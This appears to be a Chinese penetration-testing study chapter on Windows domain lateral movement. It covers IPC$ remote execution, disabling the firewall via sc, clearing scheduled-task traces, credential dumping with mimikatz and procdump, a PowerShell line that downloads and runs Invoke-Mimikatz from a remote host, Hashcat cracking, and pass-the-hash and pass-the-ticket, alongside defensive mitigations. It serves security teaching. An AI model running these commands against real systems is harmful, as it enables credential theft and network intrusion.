# 【第五章】域内横向移动分析及防御

域内横向移动投不定在夏杂的内网攻击中被广泛使用的一种技术，尤其是在高级持续威胁\(Advanced Persistent Threats,APT中。攻击者会利用该技术，以被攻陷的系统为跳板，访问其他域内主机,扩大资产范围（包括跳板机器中的文档和存储的凭证，以及通过跳板机器连接的数据库、域控制器或其他重要资产\)。

通过此类攻击手段，攻击者最终可能获取域控制器的访问权限，甚至完全控制基于Windows操作系统的基础设施和与业务相关的关键账户。因此，必须使用**强口令**来保护特权用户不被用于横向移动攻击，从而避免域内其他机器沦陷。建议系统管理员**定期修改密码**，从而使攻击者获取的权限失效。

**常用Windows远程连接和相关命令**

在渗透测试中，拿到目标计算机的用户明文密码或者NTLM Hash后，可以通过**PTH** \(Pass the Hash，凭据传递）的方法,将散列值或明文密码传送到目标机器中进行验证。与目标机器建立连接后，可以使用相关方法在远程Windows操作系统中执行命令。在多层代理环境中进行渗透测试时，由于网络条件较差，无法使用图形化界面连接远程主机。此时，可以使用命令行的方式连接远程主机\(最好使用Windows自带的方法对远程目标系统进行命令行下的连接操作）并执行相关命令。

在实际的网络环境中，针对此类情况,网络管理人员可以通过配置Windows系统自带的防火墙或组策略进行防御。

**IPC**

IPC\( Internet Process Connection\)共享“命名管道”的资源,是为了实现**进程间通信**而开放的命名管道。IPC 可以通过**验证用户名和密码获得相应的权限**，通常在**远程管理计算机和查看计算机的共享资源**时使用。

**通过 ipc$，可以与目标机器建立连接**。利用这个连接，不仅可以访问目标机器中的文件,进行上传、下载操作 还可以在日标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息。

首先，需要建立一个ipc$。输入如下命令

```
net use \\target_ip\ipc$ "password" /user:username
```

![eb49e909edd3dca4cc8432dfd0545925.png](image/eb49e909edd3dca4cc8432dfd0545925.png)

然后，在命令行环境中输入命令"net use"，查看当前的连接：

![6ff5f21b9bb46c6aee6aa008f345d196.png](image/6ff5f21b9bb46c6aee6aa008f345d196.png)

- ipc$的利用条件

        i、**开启了139、445端**

        ipc$可以实现远程登录及对默认共享资源的访问,而139端口的开启表示NetBIOS协议的应用。通过139、445 （Window 2000）端口，可以实现对共享文件/打印机的访问。因此,一般来讲，ipc$需要139、445端口的支持。

        ii、**管理员开启了默认共享**

        默认共享是为了方便管理员进行远程管理而默认开启的,包括所有的逻辑盘（c$、d$、e$等）和系统目录 winnt或 windows\(admin$\)。通过 ipc$，可以实现对这些默认共享目录的访问。

- ipc$连接失败的原因

       i, 用户名或密码错误。

       ii,目标没有打开 ipc$默认共享。

       iii,不能成功连接目标的139、445端口。

       iv,命令输入错误。

- 常见错误号

       错误号5:拒绝访问。

       错误号51: Windows 无法找到网络路径,即网络络中存在问题

       错误号53:找不到网络路径，包括IP地址错误、目标未开机,目标的 lanmanserver服务未启动、目标有防火墙（端口过滤\)。 

       错误号67:找不到网络名，包括 lanmanworkstation服务未启动、ipc$ 已被删除。

       错误号1219:提供的凭据与已存在的凭据集冲突。例如,已经和目标建立了ipc$,需要在删除原连接后重新进行连接。

       错误号1326:未知的用户名或错误的密码。

       错误号1792:试图登录，但是网络登录服务器没有启动，包括目标NetLogon服务未启动（连接域控制器时会出现此情况\)

       错误号2242:此用户的密码已过期。例如目标机器设置了账号管理策略，强制用户定期修改密码。

**使用Windows自带的工具获取远程主机信息**

- dir命令

       **在使用net use命令与远程目标机器建立ipc$后**，可以使用dir命令列出远程主机中的文件

      ![7a5de6c0df7e82e9676404df08f9d087.png](image/7a5de6c0df7e82e9676404df08f9d087.png)

- tasklist命令

       在使用net use命令与远程目标机器建立ipc$后，可以使用tasklist命令的/S、/U、 /P参数列出远程主机上运行的进程

      ![687dda13184ad886282ed8205b6c9596.png](image/687dda13184ad886282ed8205b6c9596.png)

**执行任意命令**

使用sc命令，例如关闭防火墙：

```
net use \\192.168.93.30\ipc$ "Whoami2021" /user:"Administrator"

创建服务（可以是任意命令）：
sc \\192.168.93.30 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"
启动服务：
sc \\192.168.93.30 start unablefirewall
删除服务：
sc \\192.168.93.30 delete unablefirewall
```

**计划任务**

- at命令

       at是Windows自带的用于创建计划任务的命令，它主要工作在**Windows Sever 2008之前版本**的操作系统中。使用at命令在远程目标机器上创建计划任务的流程大致如下:

       i\)使用**net time**命令确定远程机器当前的系统时间。

       ii\)使用**copy**命令将Payload 文件复制到远程目标机器中。

       iii\)使用**at**命令定时启动该Payload文件。

       iv\)**删除**使用at命令创建计划任务的**记录**。

       在使用at命令在远程机器上创建计划任务**之前**,**需要使用net use命令建立ipc$。**

       下面对以上过程进行详细讲解：

     （a）查看目标系统时间

```
net time命令可用于查看远程主机的系统时间。
net time \\192.168.111.134
```

      ![5780149412e2639ff1f9441a8b5275d2.png](image/5780149412e2639ff1f9441a8b5275d2.png)

      \(b）将文件复制到目标系统中

      首先,在本地创建一个calc.bat文件,其内容为“calc.exe”。然后,让 Windows运行一个“计算器“程序，使用Windows自带的copy命令将一个文件复制到远程主机的C盘中。命令如下

```
copy calc.bat \\192.168.111.134\C$
```

     ![829a1fb3e79ad093622f19bab9ec1031.png](image/829a1fb3e79ad093622f19bab9ec1031.png)

       \(c）使用at创建计划任务

       使用net time命令获取当前远程主机的系统时间。使用at命令让目标系统在指定时间运行一个程序

```
at \\192.168.111.134 11:30AM C:\calc.bat
```

      ![44be8f9b07e530b0816fb59b91537658.png](image/44be8f9b07e530b0816fb59b91537658.png)

      ![5b8e74851903fae022182d58becca7f4.png](image/5b8e74851903fae022182d58becca7f4.png)

       \(d）清除at记录

       计划任务不会随着它本身的执行而被删除，因此,网络管理员可以通过攻击者创建的计划任务获知网络遭受了攻击。

```
at \\192.168.111.134 /delete    #删除创建的计划任务
```

       ![e263c8b4a166969c56c9954aa066b5a0.png](image/e263c8b4a166969c56c9954aa066b5a0.png)

       使用at远程执行命令后，先将执行结果写入本地文本文件，再使用type命令远程读取该文本文件。

```
at \\192.168.111.134 11:35PM cmd.exe /c "ipconfig" >C:/1.txt"
type \\192.168.111.134\C$\1.txt
```

- schtasks命令

**       Windows Vista、Windows Server 2008及之后版本**的操作系统已经开始使用schtasks 命令代替at命令。

     i）.在远程主机上创建一个名称为“test”的计圳任务。该计划任务在**开机时启动**,启动程序为C盘下的 calc.bat,**启动权限为System**。

```
schtasks /create /s 192.168.111.134 /tn test /sc onstart /tr c:\calc.bat /ru system /f
```

     ii）.在远程主机上运行名为test的计划任务

```
schtasks /run /s 192.168.111.134 /i /rn "test"
```

     在使用schtasks命令时不需要输入密码，原因是此前已经与目标机器建立了ipc$。如果没有建立ipc$,可以添加参数/u /p

     /u administrator

     /p "123456Aa"

     /f 强制删除

     iii）.任务执行后删除计划任务

```
schtasks /delete /s 192.168.111.134 /tn "test" -f
```

     iv）.最后删除ipc$

     net use 名称 /del /y    \#在删除ipc$时，要确认删除的是自己创建的ipc$

     在使用schtasks命令时，会在系统中留下日志文件C:\\\\Windows\\Tasks\\SchedLgU.txt。如果执行schtasks命令后没有回显，可以配合ipc$执行文件，使用type命令远程查看执行结果。

**Windows系统散列值获取分析与防范**

**LM Hash和NTML Hash**

      Windowus 操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在**ntds.dit**中，加密后为散列值。Widows操作系统中的密码般由两部分组成，部分为 LMHash, 另部分为NTLMHash。在Windows操作系统中，Hash的结构通常如下。

```
username:RID:LM-HASH:NT-HASH
```

      LM Hash的全名为“LAN Manager Hash",是微软为了提高Windows操作系统的安全性面采用的散列加密算法，其本质是**DES加密**。尽管LM Hash较容易被破解,但为了保证系统的兼容性，Windows只是将LMHash禁用了\(从Windows Vista 和WindowsSever 2008版本开始，Windows操作系统默认禁用LM Hash \)。LM Hash明文密码被限定在**14位以�**�，也就是说，如果要停止使用LM Hash,将用户的密码设置为14位以上即可。如果LM Hash被禁用了，攻击者通过抓取的LM Hash通常为**“ab35454a3435451404046“\(表示LMHash为空值或被禁用\)**。

      **NTLMHash**是微软为了在提高安全性的同时保证兼容性而设计的散列加者算法，NTLMHash是基于**MD4**加密算法进行加密的。个人版从Windows Vista以后，服务器版从Wndows Sever2003以后，Windows 操作系统的认证方式均为NTLM Hash.

**单机密码抓取与防范**

      要想在Windows操作系统中抓取散列值或明文密码，必须将权限提升至**Sytem**。本地用户名、散列值和其他安全验证信息都保存在**SAM文件**中。**Isass.exe进程**用于实现Windows的安全策略\(本地安全策略和登录策略\)。可以使用工具将散列值和明文密码从内存中的ls.exe 进程或SAM文件中导出。

      在Windows操作系统中，SAM文件的保存位置是C:\\WindowslSystem32\\config\\SAM该文件是被锁定的，不允许复制。在渗透测试中，可以采用传统方法，在关闭Windows操作系统之后，**使用PE盘进入文件管理环境，直接复制SAM文件，也可以使用VSS等方法进行复制**。

下面对常见的单机密码抓取工具和方法进行分析，并给出防范建议：

- GetPass

       打开GetPass工具所在的目录。打开命令行环境。GetPassword \_x64.exe。 运行该程序后，即可获得明文密码

- PwDump7

       在命令行环境中运行PwDump7程序，可以得到系统中所有账户的NTLM Hash,可以通过彩虹表来破解散列值。如果无法通过彩虹表来破解，可以使用哈希传递的方法横向渗透测试。

      ![88b51444a11d828f8e50a5451ea81f5c.png](image/88b51444a11d828f8e50a5451ea81f5c.png)

- QuarksPwDump

       下载QuarksPwDump.exe,在命令行环境中输人“QuarksPwDump.exe \-\-dump\-hash\-local",导出NTML Hash

      ![aaddb4d9edcf04673e75b0c8f6b2fe0b.png](image/aaddb4d9edcf04673e75b0c8f6b2fe0b.png)

      QuarksPwDump已经被大多数杀毒软件标记为恶意软件

- 通过SAM和System文件抓取密码

i）导出SAM和System文件

无工具导出SAM文件，命令如下：

```
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```

通过reg的save选项将注册表的SAM、System文件导出到本地磁盘

![6f2ae176b308842102d7613ef5de6d4b.png](image/6f2ae176b308842102d7613ef5de6d4b.png)

ii）通过读取SAM和System文件获得NTLM Hash

\(a\)使用mimikatz读取SAM和System文件

将从目标系统中导出的system.hive和sam.hive文件放到本地\(与mimikatz放在同一目录下\)。运行mimikatz，输入命令"lsadump::sam /sam:sam.hive /system:system.hive" ：

![64810caa73d22ef3f689390d3d473e27.png](image/64810caa73d22ef3f689390d3d473e27.png)

\(b\)使用Cain读取SAM文件

Cain下载：[https://github.com/secretsquirrel/the\-backdoor\-factory.git](https://github.com/secretsquirrel/the-backdoor-factory.git)   。下载并安装Cain后，需要关闭防火墙，否则不能运行Cain。

\(c\)使用mimikatz直接读取本地SAM文件，导出Hash信息

该方法与\(a\)的不同之处是，需要在目标机器上运行mimikatz。在进行渗透测试时，需要考虑mimikatz在目标机器上的免杀特性。

将mimikatz免杀处理后上传至目标机器，在命令行中打开mimikatz

```
privilege::debug    #提升权限
token::elevate    #system权限
lsadump::sam    #读取本地SAM文件，获取NTML Hash
```

![4cd239ddb6b627b8d52d27ab15b7d4fe.png](image/4cd239ddb6b627b8d52d27ab15b7d4fe.png)

- 使用mimikatz在线读取SAM文件

       在mimikatz目录下打开命令行环境，输入如下命令，在线读取散列值及明文密码：

```
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
```

      ![47605080241c36ad7e6840755640ebdc.png](image/47605080241c36ad7e6840755640ebdc.png)

- 使用mimikatz离线读取lsass.dmp文件

       a）第一步，使用procdump导出lsass.dmp文件

       Procdump是微软官方发布的工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截。

       Procdump下载：[http://technet.microsoft.com/en\-us/sysinternals/dd996900.aspx](http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx)

       在管理员权限的命令行环境中输入如下命令，生成一个lsass.dmp文件：

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

       b）第二步，使用mimikatz导出lsass.dmp文件中的密码散列值

       首先，在命令行环境中运行mimikatz，将lsass.dmp文件加载到mimikatz中。然后，输入命令"sekurlsa::minidump lsass.DMP"，如果看到"Switch to MINIDUMP"字样，表示加载成功。最后，输入"sekurlsa::logonPasswords dull"命令，导出密码散列值。   \(注:必须使用管理员权限\)

      ![f4dba3af7681c70a66a013fe3644908d.png](image/f4dba3af7681c70a66a013fe3644908d.png)

- 使用PowerShell对散列值进行Dump操作

       Nishang的Get\-PassHashes.ps1脚本可用于导出散列值

       以管理员权限打开powershell,进入nishang目录，将Get\-PassHashes.ps1脚本导入，执行

```
Import-Module .\Get-PassHashes.ps1
Get-PassHashes
```

  

- 使用PowerShell远程加载mimikatz抓取散列值和明文密码

       在命令行环境中远程获取密码

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://.../Invoke-Mimikatz.ps1');Invoke-Mimikatz
```

- 单机密码抓取的防范方法

       微软为了防止用户密码在内存中以明文形式泄露，发布了补丁**KB2871997**关闭了Wdigest功能。

**       Windows Server 2012及以上版本默认关闭Wdigest**,使攻击者无法从内存中获取明文密码。Windows Server 2012以下版本，如果安装了KB2871997，攻击者同样无法获取明文密码。

在日常网络维护中，通过查看注册表项Wdigest,可以判断Wdigest功能的状态。如果该项的值为1,用户下次登录时，攻击者就能使用工具获取明文密码。**应该确保该项的值为0**,使用户明文密码不会出现在内存中。

       在命令行环境中开启或关闭Wdigest Auth,有如下两种方法。

      \(i\)使用reg add命令

      开启/关闭Wdigest Auth,命令如下。

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f    #开启
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f    #关闭
```

      \(ii\)使用PowerShell 开启/关闭Wdigest Auth

```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1    #开启
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0    #关闭
```

**使用Hashcat获取密码**

Hashcat系列软件支持使用CPU、NVIDIA GPU、ATI GPU进行密码破解。Hashcat系列软件包括Hashcat、oclHashcat，还有一个单独的版本oclRausscrack。它们的区别为：Hashcat只支持CPU破解；oclHashcat和oclGausscrack支持GPU加速破解。oclHashcat支持破解Windows密码、Linux密码、office密码、Wi\-Fi密码、MySQL密码、SQL Server密码，以及由MD5、SHA1、SHA256等国际主流加密算法加密的密码

- 安装Hashcat

以Linux为例安装Hashcat。（kali linux默认集成了Hashcat）：

```
下载：
git clone  https://github.com/hashcat/hashcat.git
编译：
make
安装：
make install
运行，查看帮助信息：
./hashcat -h
```

![9171ef95e171d0e7e6c09cf1bea7f375.png](image/9171ef95e171d0e7e6c09cf1bea7f375.png)

- Hashcat的使用方法

使用\-b参数，测试使用当前机器进行破解的基准速度

因为测试时使用的是**虚拟机**，所以需要使用\-**\-force参数强制执行**

![0aa164f9742ac09ca0ecf431d428c7bf.png](image/0aa164f9742ac09ca0ecf431d428c7bf.png)

i）指定散列值的类型

在Hashcat中，可以使用**\-m**参数指定散列值的类型

常见的散列值类型，可以参考hashcat的帮助信息，也可以参考hashcat的官方网站[https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

![54bdefd260230836f7764ba28e8a9788.png](image/54bdefd260230836f7764ba28e8a9788.png)

ii）指定破解模式

可以使用"\-a number"来指定hashcat的破解模式。通过帮助信息可以知道，有如下几种破解模式

```
0 = Straight                 //字典破解            
1 = Combination        //组合破解
2 = Toggle-Case
3 = Brute-force           //掩码暴力破解
4 = Permutation         //组合破解
5 = Table-Lookup
```

iii）常用命令

在渗透测试中，通常使用字典模式进行破解。输入如下命令，Hashcat就将开始破解

```
hashcat -a 0 -m xx <hashfile> <zidian1> <zidian2>
```

\-a 0   :     以字典模式破解

\-m xx   :    指定\<hashfile\>内的散列值类型

\<hashfile\> : 将多个散列值存入文本，等待破解。

\<zidian1\> \<zidain2\> : 指定字典文件

将1到8指定为数字进行破解，命令如下：

```
hashcat -a 3 --increment --increment-min 1 --increment-max 8 ?d?d?d?d?d?d?d?d?d -O
```

破解Windows散列值，命令如下：

```
hashcat -m 1000 -a 0 -o winpassok.txt win.hash password.lst --username
```

破解Wi\-Fi握手包，命令如下。在这里，需要使用aircrack\-ng把cap格式转换成hccap格式，才可以使用hashcat进行破解

```
aircrack-ng <out.cap> -J <out.hccap>
hashcat -m 2500 out.hccap dics.txt              # -m 2500 : 指定散列值的类型为WPA/PSK
```

iv）常用选项

\-show : 仅显示已经破解的密码

\-o,\-outfile=FILE ：定义散列值文件，恢复文件名和保存位置

\-n,\-threads=NUM : 线程数

\-\-remove : 把破解出来的密码从散列值列表中移除

\-\-segment\-size 512 : 设置内存缓存的大小（可以提高破解速度），单位为MB

**如何防范攻击者抓取明文密码和散列值**

- 设置Active Directory 2012 R2 功能级别

Windws Sever 2012R2新增了一个名为“受保护的用户”的用户组。**只要将需要保护的用户放人该组（Protected Users），攻击者就无法使用mimikaz等工具抓取明文密码和散列值了**。

实验环境：

操作系统: Windors Serer 2012 R2,未更新任何朴丁。

域名: hello.testlab

用户名: Administrator

密码: 123456Aa

控制面板\\系统和安全\\管理工具\\AD用户和计算机\\Users

![ab2d809d7a61d4e252615aea781f3343.png](image/ab2d809d7a61d4e252615aea781f3343.png)

- 安装KB2871997

**KB2871997是微软用来解决PsExec或IPC远程查看\(ipc$ \)问题的补丁**，能使本地账号不再被允许远程接人计算机系统，但系统默认的**本地管理员账号Administrator 这个SID为500的用户例外**——即使将 Administrator改名，该账号的SID仍为500，攻击者仍然可以使用横向攻击方法获得内网中其他计算机的控制权。**安装KB2871997后，仍需禁用默认的Administrator账号，以防御哈希传递攻击**。

在日常网络维护中，可以通过Windows update进行自动更新，也可以访同微软官方网站下载补丁文件进行修复。

- 通过修改注册表禁止在内存中存储明文密码

微软在Windows xp版本中添加了一个名为**WDigest**的协议。该协议能够使Windows将明文密码存储在内存中，以方便用户登录本地计算机。

修改注册表，解决内存中以明文存储密码的问题。执行如下命令，在注册表中添加一个键值，将其**设置为0**

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 
```

电脑**注销**后,**windows将不会把密码明文存储在内存中**。

执行"reg query"命令，查询键值是否添加成功

```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```

![fefdad3db908ce9fa42bdb9395c3b474.png](image/fefdad3db908ce9fa42bdb9395c3b474.png)

注销电脑后，使用mimikatz抓取密码。此时只能获取NTML Hash,因为NTML Hash很难被破解，所以设置的Windows密码足够强壮，并定时修改密码，就可以降低被彻底攻陷的可能性。

- 防御mimikatz攻击

**根据Debug权限确定哪些用户可以将调试器附加到任何进程或者内核中**。在默认情况下，此服务为本地管理员**Administrator**所有。不过除非是系统进程，本地管理员几乎不需要使用此权限。

![a66e7848ea1f081b2680a2d679db4cbf.png](image/a66e7848ea1f081b2680a2d679db4cbf.png)

mimikatz在抓取散列值或明文密码时**需要使用Debug权限**\(因为mimikatz需要和Isass进程进行交互，如果没有Debug权限，mimikatz 将不能读取lsass进程\)。因此，在维护网络时，可以针对这一点采取防御措施。**将拥有Debug权限的本地管理员从Administrators组中删除**。重启系统，再次运行mimikatz,输人"privilege::debug", 将看到错误信息。此时，已经无法使用mimikatz抓取散列值及明文密码了。

**哈希传递攻击分析与防范**

**哈希传递攻击的概念**

      大多数渗透测试人员都听说过哈希传递\(Pass The Hash\)攻击。该方法通过找到与账户相关的**密码散列值\(通常是NTLM Hash \)**来进行攻击。在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管管理员账号和密码，因此，如果计算机的本地理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登录内网中的其他计算机。通过哈希传递，攻击者不需要花时间破解密码散列值\(进而获得密码明文\)。

      在Windows网络中，散列值就是用来证明身份的\(**有正确的用户名和密码散列值，就能通过验证**），而微软直接的产品和工具显然不会支持这种攻击，于是，攻击者往往会使用第三方工具来完成任务。在**Windows server2012R2**及之后版本的操作系统中，默认在内存中不会记录明文密码，因此，攻击者往往会使用工具将散列值传递到其他计算机中，进行权限验证，实现对远程计算机的控制。

**哈希传递攻击分析**

      散列值：当用户需要登录某网站时，如果该网站使用明文的方式保存用户的密码，那么，一且该网站出现安全漏洞，所有用户的明文密码均会被泄露。由此，产生了散列值的概念。当用户设置密码时，网站服务器会对用户输人的密码进行散列加密处理\(通常使用MD5算法\)。散列加密算法一般为单向不可逆算法。当用户登录网站时，会先对用户输人的密码进行散列加密处理，再与数据库中存储的散列值进行对比，如果完全相同则表示验证成功。

      主流的Windows操作系统，通常会使用NTLM Hash对访问资源的用户进行身份验证。早期版本的Windows操作系统，则使用LM Hash对用户密码进行验证。但是，当密码大于等于15位时，就无法使用LMHash了。从Windows Vista和Windows Server 2008版本开始，Windows 操作系统默认禁用LM Hash,因为在使用NTLM Hash进行身份认证时，不会使用明文口令，而是将明文口令通过系统API \(例如LsaLogonUser \)转换成散列值。不过，攻击者在获得密码散列值之后，依旧可以使用哈希传递攻击来模拟用户进行认证。

      下面通过两个实验来分析哈希传递攻击的原理：

- 使用NTML Hash进行哈希传递

实验环境:远程系统

   域名:testlab

   IP地址: 1.1.1.10

   用户名: Administrator

   NTLM Hash:f478e94103927311912ff00846210a30

在目标机器中，以管理员权限运行mimikatz,输人如下命令：

```
mimikatz "privilege::debug" "sekurlsa::pth /user:Administrator /domain:testlab /ntlm:f478e94103927311912ff00846210a30
```

此时会弹出一个cmd.exe。在命令行环境中尝试列出域控制器C盘的内容

```
dir \\dc\c$                 #dir后跟要使用的主机名，而不是IP地址
```

![04cc02c94b74234588e73c7673c8b00f.png](image/04cc02c94b74234588e73c7673c8b00f.png)

![94abf1d7a492643c98b664f3f7b4cd61.png](image/94abf1d7a492643c98b664f3f7b4cd61.png)

- 使用AES\-256密钥进行哈希传递

实验环境：

   远程系统（必须安装KB2871997\)

   域名：[testlab.com](http://testlab.com/)

   ip:1.1.1.10

   主机名：WIN\-2008

   用户名：Administrator

   AES\-256密钥：9fcd929325b65ed0fd9adafa339dfb343d2d0ac05ad1b3edf3ea5ff32689c39b

使用mimikatz抓取AES\-256密钥

```
mimikatz "privilege::debug" "sekurlsa::ekeys"
```

在远程目标机器中，管理员权限运行mimikatz

```
mimikatz "privilege::debug" "sekurlsa::pth /user:Administrator /domain:testlab.com /aes256:9fcd929325b65ed0fd9adafa339dfb343d2d0ac05ad1b3edf3ea5ff32689c39b
```

访问远程主机

```
C:\Windows\system32>dir \\WIN-2008\c$              # 主机名  不是 IP地址
```

![e3b083431af8465fd2cdc5a60d369202.png](image/e3b083431af8465fd2cdc5a60d369202.png)

PS：**必须在目标机器上安装KB2871997，才可以通过导入AES\-256密钥的方式进行横向移动**（这种攻击方法称为**Pass The Key**\)

在本实验中需要注意以下几点:

i）**dir 后跟要使用的主机名**，而不是IP地址，否则会提示用户名或密码错误。

ii）除了AES\-256密钥，AES\-128密钥也可以用来进行哈希传递。

iii）**使用AES密钥对远程主机进行哈希传递的前提是在本地安装KB2871997。**

iv）**如果安装了KB2871997,仍然可以使用SID为500的用户的NTLM Hash进行哈希传递**。

v）如果要使用mimikaz的哈希传递功能，需要具有**本地管理员权限**。这是由mimikatz的实现机制决定的\(需要高权限进程**lsass.exe**的执行权限\)。

更新KB2871997补丁产生的影响

       微软在2014年5月发布了KB2871997。 **该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是:无法通过本地管理员对远程计算机使用PsExec, WMI, smbexec, schtasks,也无法访问远程主机的文件共享等**。

       在实际测试中，更新KB2871997后，发现无法使用常规的哈希传递方法进行横向移动，但**Administrator账号\(SID为500 \)**例外——使用该账户的散列值依旧**可以**进行**哈希传递**。

       这里强调的是SID为500的账号。在一些计算机中，即使将Administator改名，也不会影响SID的值。所以，如果攻击者使用SID为500的账号进行横向移动，就不会受到K827197的影响。在实际网络维护中需要特别注意这一点。

**票据传递攻击分析与防御**

要想使用mimikatz的哈希传递功能，必须具有本地管理员权限。mimikatz同样提供了不需要本地管理员权限进行横向渗透测试的方法，例如票据传递（pass the ticket,PTT\)。本节将通过实验分析票据传递攻击的思路，并给出防范措施。

**使用mimikatz进行票据传递**

使用mimikatz，可以将内存中的票据导出。在mimikatz中输入如下命令：

```
mimikatz "privilege::debug" "sekurlsa::tickets /export"
```

![c823ee3012188d4b7cdcb9f19783c5f3.png](image/c823ee3012188d4b7cdcb9f19783c5f3.png)

执行以上命令后，会在当前目录下出现多个服务的票据文件，例如krbtgt、cifs、ldap等

使用mimikatz清楚内存中的票据：kerberos::purge

![a68e5a864ba6c002e099645483b1fb6d.png](image/a68e5a864ba6c002e099645483b1fb6d.png)

将票据文件注入内存，命令如下：

```
mimikatz "kerberos::ptt "C:\ticket\[0;3e7]-2-0-60a00000-WIN-1D09BAA27UF$@krbtgt-YOKAN.COM""
```

![2a9fa6879eaab5ff900592e89205f4f9.png](image/2a9fa6879eaab5ff900592e89205f4f9.png)

将高权限的票据文件注入内存后，将列出远程计算机系统的文件目录

![8e4af0474355172ed55284f0584363aa.png](image/8e4af0474355172ed55284f0584363aa.png)

**使用kekeo进行票据传递**

票据传递也可以使用gentilkiwi开源的另一款工具kekeo实现，其下载地址见：[https://github.com/gentilkiwi/kekeo](https://github.com/gentilkiwi/kekeo)

kekeo需要使用域名、用户名、NTLM Hash三者配合生成票据，再将票据导入，从而直接连接远程计算机。

实验环境：

   远程系统（必须安装KB2871997\)

   域名：yokan.com

   ip:192.168.111.134

   用户名：Administrator

   NTLM Hash：f478e94103927311912ff00846210a30

```
kekeo "tgt::ask /user:administrator /domain:testlab.com /ntlm:f478e94103927311912ff00846210a30"    #在当前目录生成一个票据文件
kerberos::purse    #在kekeo中清除当前内存中的票据
kerberos::ptt xxxxxx.kirbi    #使用kekeo将票据文件导入内存，导入完成，exit推出，使用dir命令查看远程主机的文件。
```

![11111c3f68f46cf8b064814225e34d22.png](image/11111c3f68f46cf8b064814225e34d22.png)

klist purge    \#windows命令行下也可以清除票据

![f8260ddc7f46ae80be93eb55e4c67cd5.png](image/f8260ddc7f46ae80be93eb55e4c67cd5.png)

**如何防范票据传递攻击**

总结一下本节两个实验的思路:

i）使用dir命令时，务必使用主机名。如果使用IP地址，就会导致错误。

ii）票据文件注人内存的默认有效时间为10 小时。

iii）在目标机器上不需要本地管理员权限即可进行票据传递。

通过以上几点，就可以理清防御票据传递攻击的思路了。

**PsExec的使用**

PsExec是SysInternals套件中的一款功能强大的软件。起初PsExec主要用于大批量Windows主机的运维，在域环境下效果尤其好。但是，攻击者渐渐开始使用PsExec,通过命令行环境与目标机器进行连接，甚至控制目标机器，而不需要通过远程桌面协议\( RDP \)进行图形化控制，降低了恶意操作被管理员发现的可能性\(因为PsExec是Windows提供的工具，所以杀毒软件将其列在白名单中\)。

PsExec可以在Windows Vista/NT 4.0/2000/XP/Server 2003/Server 2008/Server 2012/Server 2016\(包括64位版本\)上运行。

**PsTook工具包中的PsExec**

PsExec包含在PsTools工具包中\(PsTools 的下载地址见\[[https://download.sysinternals.com/files/PSTools.zip](https://download.sysinternals.com/files/PSTools.zip)\]\)。通过PsExec.可以在远程计算机上执行命令，也可以将管理员权限提升到System权限以运行指定的程序。PsExec 的基本原理是:通过管道在远程目标机器上创建一个psexec 服务，并在本地磁盘中生成\-一个名为“PSEXESVC"的进制文件， 然后，通过psexec 服务运行命令，运行结束后删除服务。

首先，需要获取目标操作系统的交互式Shell在建立了ipc$ 的情况下，执行如下命今，获取System权限的Shell

```
PsExec.exe -accepteula \\192.168.111.170 -s cmd.exe

-accepteula:    第一次运行PsExec会弹出确认框，使用该参数就不会出现
-s:    以system权限运行远程进程，获得一个system权限的交互式shell,不使用此参数获得一个administrator的shell
```

![dd57334f86ff343710bc7fe1f45211e3.png](image/dd57334f86ff343710bc7fe1f45211e3.png)

![f81232cb4672cf8a37c8df9ad827cd48.png](image/f81232cb4672cf8a37c8df9ad827cd48.png)

如果没有建立ipc$，PsExec有两个参数可以通过指定账户和密码进行远程连接

```
psexec \\192.168.111.170 -u yokan\Administrator -p xxxxxxxxxx cmd.exe 

#-u 域\用户名 -p密码
```

![e188998551f3f41a489c2957d3d3fc5d.png](image/e188998551f3f41a489c2957d3d3fc5d.png)

使用psexec在远程计算机上进行回显

```
psexec \\192.168.111.170 -u yokan\Administrator -p xxxxxxxxxx cmd.exe /c "ipconfig"
```

![db85390561e3c805f4d4c9666fb00d01.png](image/db85390561e3c805f4d4c9666fb00d01.png)

在使用PsExec时，需要注意以下几点:

i）需要远程系统开启admin$共享\(默认是开启的\)

ii）在使用ipc$连接目标系统后，不需要输人账号和密码。

iii）在使用psexec执行远程命令时，会在目标系统中创建一个psexec服务。 命令执行后,psexec服务将被自动删除。由于创建或删除服务时会产生大量的日志，可以在进行攻击溯源时通过日志反推攻击流程。

iv）使用PsExec可以直接获得System权限的交互式Shell。

**Metasploit中的psexec模块**

Metasploit的插件是使用Ruby语言编写的，渗透测试人员可以自行编写插件并将其集成在Metasploit框架中。网络维护人员可以使用该工具对所管理网络中的机器进行检测，及时发现并处理相关问题，提高整体业务安全水平。

```
msfconsole
search psexec
```

![87e8fddfde0eb9179b4a2382429e3218.png](image/87e8fddfde0eb9179b4a2382429e3218.png)

在本节的实验中，需要使用的模块如下：

```
exploit/windows/smb/psexec
exploit/windows/smb/psexec_psh(psexec的powershell版本）
```

